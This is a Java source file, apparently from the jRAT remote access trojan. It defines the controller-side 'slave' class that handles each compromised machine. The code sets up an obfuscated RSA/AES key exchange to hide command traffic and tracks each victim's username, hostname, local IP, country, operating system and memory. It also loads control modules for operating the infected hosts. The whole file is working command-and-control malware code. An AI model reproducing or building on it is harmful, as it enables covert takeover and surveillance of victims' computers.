package jrat.controller;

import jrat.api.ControllerModule;
import jrat.api.ui.ClientPanel;
import jrat.api.ui.ControlPanelItem;
import jrat.common.Logger;
import jrat.common.Version;
import jrat.common.codec.Hex;
import jrat.common.crypto.Crypto;
import jrat.common.crypto.CryptoUtils;
import jrat.common.crypto.ObfuscatedStreamKeyExchanger;
import jrat.common.crypto.StreamKeyExchanger;
import jrat.controller.crypto.GlobalKeyPair;
import jrat.controller.exceptions.CloseException;
import jrat.controller.io.CountingInputStream;
import jrat.controller.io.CountingOutputStream;
import jrat.controller.ip2c.Country;
import jrat.controller.ip2c.IP2Country;
import jrat.controller.net.ConnectionHandler;
import jrat.controller.net.ServerListener;
import jrat.controller.settings.Settings;
import jrat.controller.settings.SettingsCustomID;
import jrat.controller.settings.StatisticsCountry;
import jrat.controller.threads.NetworkCounter;
import jrat.controller.ui.panels.PanelMainClients;
import jrat.controller.utils.FlagUtils;
import jrat.controller.utils.TrayIconUtils;
import oslib.AbstractOperatingSystem;
import oslib.OperatingSystem;

import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import javax.swing.*;
import java.awt.*;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;
import java.security.PublicKey;
import java.util.*;
import java.util.List;
import java.util.Timer;

public abstract class AbstractSlave implements Runnable {

    /**
     * Frames belonging to this client that are currently active
     */
    private Map<Class<? extends ClientPanel>, ClientPanel> frames = new HashMap<>();

	/**
	 * Unique random assigned ID for this client, between 0 and {@link Integer#MAX_VALUE}
	 */
	protected final int uniqueId = new Random().nextInt(Integer.MAX_VALUE);

	/**
	 * The protocol version
	 */
	protected int protocolVersion;
	
	/**
	 * If this client has been added to the main table, prevents repeatedly sending authentication packet and duplicating over and over
	 */
	protected boolean added;
	
	/**
	 * The server listener that accepted the connection
	 */
	protected ServerListener connection;
	
	/**
	 * Socket for this client
	 */
	protected Socket socket;

	/**
	 * CountingInputStream for {@link #socket}, used for measuring network usage
	 */
	private CountingInputStream inputStream;
	
	/**
	 * CountingOutputStream for {@link #socket}, used for measuring network usage
	 */
	private CountingOutputStream outputStream;

	/**
	 * DataInputStream for {@link #socket} wrapped around {@link #inputStream}
	 */
	protected DataInputStream dis;
	
	/**
	 * DataOutputStream for {@link #socket} wrapped around {@link #outputStream}
	 */
	protected DataOutputStream dos;
	
	/**
	 * ID for this client if renamed
	 */
	protected String renamedid;
	
	/**
	 * LAN address
	 */
	protected String localip;
	
	/**
	 * 2 char country code retrieved using {@link IP2Country}
	 */
	protected String country;
	
	/**
	 * Public Key retrieved when exchanging {@link #key}
	 */
	protected PublicKey rsaKey;
	
	/**
	 * Randomly generated encryption key with length {@link Crypto#KEY_LENGTH}
	 */
	protected byte[] key;
	
	/**
	 * Randomly generated encryption initialization vector with length {@link Crypto#IV_LENGTH}
	 */
	protected byte[] iv;
	
	/**
	 * If client has authenticated
	 */
	protected boolean authed;
		
	/**
	 * If client is selected in {@link PanelMainClients} and/or the web interface
	 */
	protected boolean selected;
	
	/**
	 * If this client is running on a headless system
	 */
	protected boolean headless;
	
	/**
	 * Time last ping packet was sent specified by {@link System#currentTimeMillis()}
	 */
	protected long pingms = 0;
	
	/**
	 * Current ping in milliseconds
	 */
	protected int ping = 0;
	
	/**
	 * Current status code
	 */
	protected String status;
	
	/**
	 * Bytes of RAM
	 */
	protected long memory;
	
	/**
	 * Client ID specified when built
	 */
	protected String id;
	
	/**
	 * Hostname, environment variable "COMPUTERNAME" on Windows or "hostname" on *nix
	 */
	protected String hostname;
	
	/**
	 * Computer username defined by property "user.name"
	 */
	protected String username;
	
	/**
	 * Cached thumbnail icon
	 */
	protected ImageIcon thumbnail;
	
	/**
	 * jRAT version of client defined by {@link Version#getVersion()}
	 */
	protected String version;
	
	/**
	 * Operating System used by client
	 */
	protected AbstractOperatingSystem os;

	/**
	 * IP address + port used by client in format "IP / PORT"
	 */
	protected String ip;
	
	/**
	 * Hostname of client
	 */
	private String host;
	
	/**
	 * Current downloaded bytes (updated each second by {@link NetworkCounter})
	 */
	protected int currentIn;
	
	/**
	 * Current uploaded bytes (updated each second by {@link NetworkCounter})
	 */
	protected int currentOut;
	
	/**
	 * Total downloaded bytes (updated each second by {@link NetworkCounter})
	 */
	protected long totalIn;
	
	/**
	 * Total uploaded bytes (updated each second by {@link NetworkCounter})
	 */
	protected long totalOut;

	/**
	 * Connection slaveState
	*/
	protected SlaveState slaveState = SlaveState.DEFAULT;

	public final List<ControllerModule> loadedModules = new ArrayList<>();

	public AbstractSlave(ServerListener connection, Socket socket) {		
		if (connection != null && socket != null) {
			this.connection = connection;
			this.socket = socket;

			this.ip = socket.getInetAddress().getHostAddress() + " / " + socket.getPort();
			this.host = socket.getInetAddress().getHostName();
		}
	}

	public void initialize() throws Exception {
		setSlaveState(SlaveState.CONNECTED);

		this.inputStream = new CountingInputStream(socket.getInputStream());
		this.outputStream = new CountingOutputStream(socket.getOutputStream());

		this.dis = new DataInputStream(inputStream);
		this.dos = new DataOutputStream(outputStream);
		
		this.socket.setSoTimeout(connection.getTimeout());
		this.socket.setTrafficClass(24);
		
		if (Main.debug) {
			String randomCountry = SampleMode.randomCountry();
			if (randomCountry != null) {
				setCountry(randomCountry);
			}
		} else if (Settings.getGlobal().getBoolean(Settings.KEY_USE_COUNTRY_DB)) {
			Country country = FlagUtils.getCountry(this);

			if (country != null) {
				this.country = country.get2cStr();

				if (this.country.equalsIgnoreCase("ZZ")) {
					this.country = "?";
				}
			} else {
				this.country = "?";
			}
		} else {
			this.country = "?";
		}

		Main.instance.getPanelLog().addEntry(LogAction.CONNECT, this, "");

		this.protocolVersion = dis.readByte();
		
		StreamKeyExchanger exchanger = new ObfuscatedStreamKeyExchanger(GlobalKeyPair.getKeyPair(), dis, dos);
		exchanger.writePublicKey();
		rsaKey = exchanger.readRemoteKey();
		
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(128);
        SecretKey secretKey = keyGen.generateKey();
		key = secretKey.getEncoded();

		boolean multipleIvs = Version.getProtocolVersion() >= 6;

        IvParameterSpec ivSpecIn = CryptoUtils.getRandomIv();
        IvParameterSpec ivSpecOut = CryptoUtils.getRandomIv();

        byte[] ivIn = ivSpecIn.getIV();
        byte[] ivOut = ivSpecOut.getIV();

        byte[] encryptedKey = Crypto.encrypt(key, rsaKey, "RSA");
        byte[] encryptedIvIn = Crypto.encrypt(ivIn, rsaKey, "RSA");
        byte[] encryptedIvOut = Crypto.encrypt(ivOut, rsaKey, "RSA");

        dos.writeInt(encryptedKey.length);
        dos.writeInt(encryptedIvIn.length);
        if (multipleIvs) {
            dos.writeInt(encryptedIvOut.length);
        }

        dos.write(encryptedKey);
        dos.write(encryptedIvIn);

        if (multipleIvs) {
            dos.write(encryptedIvOut);
        }

		Logger.log("Encryption key: " + Hex.encode(key));
		Logger.log("Encryption IV in: " + Hex.encode(ivIn));

		if (multipleIvs) {
            Logger.log("Encryption IV out: " + Hex.encode(ivOut));
        }

		Cipher inCipher = CryptoUtils.getStreamCipher(Cipher.DECRYPT_MODE, secretKey, ivSpecIn);
		Cipher outCipher = CryptoUtils.getStreamCipher(Cipher.ENCRYPT_MODE, secretKey, multipleIvs ? ivSpecOut : ivSpecIn);
		
		this.dis = new DataInputStream(new CipherInputStream(new CountingInputStream(inputStream), inCipher));
		this.dos = new DataOutputStream(new CipherOutputStream(new CountingOutputStream(outputStream), outCipher));
    }
	
	public void update() {
		Main.instance.getPanelClients().repaint();
	}
	
	public void writeLine(String s) throws Exception {
		dos.writeShort(s.length());
		dos.writeChars(s);
	}

	public String readLine() throws Exception {
		short len = dis.readShort();

		StringBuilder builder = new StringBuilder();
		
		for (int i = 0; i < len; i++) {
			builder.append(dis.readChar());
		}

		String s = builder.toString();

		return s;
	}
	
	/**
	 * @return If client is connected
	 */
	public boolean isConnected() {
		return socket.isConnected() && !socket.isClosed();
	}
	
	/**
	 * Disconnect client without reason
	 */
	public void disconnect() {
		this.disconnect(new Exception("Disconnect requested"));
	}
	
	/**
	 * Disconnect client
	 * @param ex Reason for disconnection
	 */
	public void disconnect(Exception ex) {
		setSlaveState(SlaveState.DISCONNECTED);

		String message = ex.getClass().getSimpleName() + ": " + ex.getMessage();

		Main.instance.getPanelLog().addEntry(LogAction.DISCONNECT, this, message);

		try {
			ConnectionHandler.removeSlave(this, Settings.getGlobal().getInt(Settings.KEY_STATE_DELAY));
		} catch (Exception e) {
			
		}

		TrayIconUtils.showMessage(Main.instance.getTitle(), "Server " + getIP() + " disconnected: " + message, TrayIcon.MessageType.ERROR);
	}

	/**
	 * Save current time in {@link #pingms} variable and send ping packet
	 * @throws Exception
	 */
	protected abstract void ping() throws Exception;
	
	/**
	 * Gets the file path separator
	 * @return If running Windows \, if running any other system /
	 */
	public String getFileSeparator() {
		if (getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			return "\\";
		} else {
			return "/";
		}
	}

	/**
	 * Saves current time in {@link #pingms} variable and calls {@link #ping()}
	 * @throws Exception
	 */
	public void beginPing() throws Exception {
		pingms = System.currentTimeMillis();
		ping();
	}

	public ServerListener getConnection() {
		return connection;
	}

	public Socket getSocket() {
		return socket;
	}

	public String getIP() {
		return ip;
	}
	
	public String getHost() {
		return host;
	}
	
	public String getRawIP() {
		return getIP().split(" / ")[0];
	}

	public String getPort() {
		return getIP().split(" / ")[1];
	}
	
	public void closeSocket(CloseException ex) {
		try {
			socket.close();
			ex.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void writeShort(short i) throws Exception {
		dos.writeShort(i);
	}

	public short readShort() throws Exception {
		return dis.readShort();
	}

	public byte readByte() throws Exception {
		return dis.readByte();
	}

	public void writeByte(int b) throws Exception {
		dos.writeByte(b);
	}

	public boolean readBoolean() throws Exception {
		return dis.readBoolean();
	}

	public void writeBoolean(boolean b) throws Exception {
		dos.writeBoolean(b);
	}

	public int readInt() throws Exception {
		return dis.readInt();
	}

	public void writeInt(int i) throws Exception {
		dos.writeInt(i);
	}

	public long readLong() throws Exception {
		return dis.readLong();
	}

	public void writeLong(long l) throws Exception {
		dos.writeLong(l);
	}

	public void writeLine(Object obj) throws Exception {
		writeLine(obj.toString());
	}

	public void readFully(byte[] b) throws Exception {
	    dis.readFully(b);
    }

    public void writeChar(char c) throws Exception {
	    dos.writeChar(c);
    }

    public void write(byte[] b) throws Exception {
        dos.write(b);
    }

    public void write(byte[] b, int off, int len) throws Exception {
	    dos.write(b, off, len);
    }
	
	public byte[] getKey() {
		return key;
	}

	public int getUniqueId() {
		return uniqueId;
	}
	
	public DataInputStream getDataInputStream() {
		return dis;
	}
	
	public DataOutputStream getDataOutputStream() {
		return dos;
	}
	
	public CountingInputStream getCountingInputStream() {
		return inputStream;
	}
	
	public CountingOutputStream getCountingOutputStream() {
		return outputStream;
	}

	public int getPing() {
		return ping;
	}

	public void setPing(int ping) {
		this.ping = ping;
	}
	
	public void pong() {
		long ping = System.currentTimeMillis() - pingms;
		this.ping = (int) ping;
	}
	
	public String getUsername() {
		return username;
	}

	public void setUsername(String username) {
		this.username = username;
	}

	public String getID() {
		return id;
	}

	public void setID(String id) {
		this.id = id;
		
		SettingsCustomID.CustomIDEntry entry = SettingsCustomID.getGlobal().findEntry(getRawIP());
		
		if (entry != null) {
			setRenamedID(entry.getName());
		}
		
		update();
	}
	
	public String getRenamedID() {
		return renamedid;
	}

	public void setRenamedID(String renamedid) {
		this.renamedid = renamedid;
	}

	public boolean isSelected() {
		return selected;
	}

	public void setSelected(boolean selected) {
		this.selected = selected;
	}

	public ImageIcon getThumbnail() {
		return thumbnail;
	}

	public void setThumbnail(ImageIcon thumbnail) {
		this.thumbnail = thumbnail;
		update();
	}
	
	public String getCountry() {
		return country.toUpperCase();
	}

	public boolean isAuthenticated() {
		return authed;
	}

	public void setAuthenticated(boolean b) {
		this.authed = b;
	}
	
	public String getVersion() {
		return version;
	}

	public void setVersion(String version) {
		this.version = version;
	}

	public boolean isUpToDate() {
		return getVersion().equals(Version.getVersion());
	}
	
	public ImageIcon getFlag() {
		return FlagUtils.getFlag(getCountry());
	}

	public void setCountry(String country) {
		this.country = country;
				
		StatisticsCountry.getGlobal().add(this);
	}

	public void setOperatingSystem(AbstractOperatingSystem os) {
		this.os = os;
	}

	public AbstractOperatingSystem getOperatingSystem() {
		return os;
	}

	public String getHostname() {
		return hostname;
	}

	public void setHostname(String name) {
		this.hostname = name;
	}
	
	/**
	 * Formats a display string for this client from username and hostname
	 * @return If operating system is Windows, returns "Host\User", if *nix, user@host
	 */
	public String getDisplayName() {
		String username = this.getUsername();
		String computerName = this.getHostname();
		
		if (username == null) {
			username = "Unknown";
		}
		
		if (computerName == null) {
			computerName = "Unknown";
		}
		
		String s;
		
		if (getOperatingSystem() != null && getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			s = computerName + "\\" + username;
		} else {
			s = username + "@" + computerName;
		}
		
		return s;
	}
	
	public String getLocalIP() {
		return localip;
	}

	public void setLocalIP(String localip) {
		this.localip = localip;
	}

	public String getStatus() {
		return status;
	}

	public void setStatus(int status) {
		this.setStatus(Status.getStatusFromID(status));
		update();
	}

	public void setStatus(String status) {
	    this.status = status;
	    update();
    }

	public long getMemory() {
		return memory;
	}

	public void setMemory(long memory) {
		this.memory = memory;
	}
	
	public boolean isAdded() {
		return added;
	}
	
	public void setAdded(boolean added) {
		this.added = added;
	}
	
	public boolean isHeadless() {
		return this.headless;
	}
	
	public void setHeadless(boolean headless) {
		this.headless = headless;
	}
	
	public int getCurrentIn() {
		return currentIn;
	}

	public void setCurrentIn(int currentIn) {
		this.currentIn = currentIn;
	}

	public int getCurrentOut() {
		return currentOut;
	}

	public void setCurrentOut(int currentOut) {
		this.currentOut = currentOut;
	}

	public long getTotalIn() {
		return totalIn;
	}

	/**
	 * Increases the total download counter
	 * @param in
	 */
	public void increaseTotalIn(long in) {
		this.totalIn += in;
	}

	public long getTotalOut() {
		return totalOut;
	}

	/**
	 * Increases the total upload counter
	 * @param out
	 */
	public void increaseTotalOut(long out) {
		this.totalOut += out;
	}

	/**
	 * Set slave state with default delay
	 * @param state
     */
	public void setSlaveState(SlaveState state) {
		setSlaveState(state, Settings.getGlobal().getInt(Settings.KEY_STATE_DELAY));
	}

	/**
	 * Set slave state
	 * @param slaveState
	 * @param delay time to be active in milliseconds
     */
	public void setSlaveState(SlaveState slaveState, int delay) {
		this.slaveState = slaveState;
		this.update();
		new Timer().schedule(new TimerTask() {
			@Override
			public void run() {
				AbstractSlave.this.clearState();
			}
		}, delay);
	}

	/**
	 * @return current slave state
     */
	public SlaveState getSlaveState() {
		return this.slaveState;
	}

	/**
	 * Sets state to DEFAULT
	 */
	public void clearState() {
		this.slaveState = SlaveState.DEFAULT;
		this.update();
	}

    /**
     * Adds a frame for this client
     * @param clazz the class of the frame
     * @param frame
     */
    public void addFrame(Class<? extends ClientPanel> clazz, ClientPanel frame) {
        frames.put(clazz, frame);
    }

    /**
     * Get an active frame for this client
     * @param clazz the class of the frame
     * @return the frame
     */
    public ClientPanel getPanel(Class<? extends ClientPanel> clazz) {
        return frames.get(clazz);
    }

    /**
     * Remove an active frame and do not reuse it
     * @param clazz
     */
    public void removePanel(Class<? extends ClientPanel> clazz) {
        frames.remove(clazz);
    }

    public List<ControlPanelItem> getControlPanelItems() {
        List<ControlPanelItem> list = new ArrayList<>();

        for (ControllerModule mod : loadedModules) {
            List<ControlPanelItem> items = mod.getControlPanelItems();

            list.addAll(items);
        }

        return list;
    }

    /**
	 * Searches connected clients from {@link #uniqueId}
	 * @param id
	 * @return the client found with the ID, or null if nothing found
	 */
	public static AbstractSlave getFromId(int id) {
		for (AbstractSlave slave : Main.connections) {
			if (slave.getUniqueId() == id) {
				return slave;
			}
		}
		
		return null;
	}

    public int getProtocolVersion() {
        return protocolVersion;
    }
}
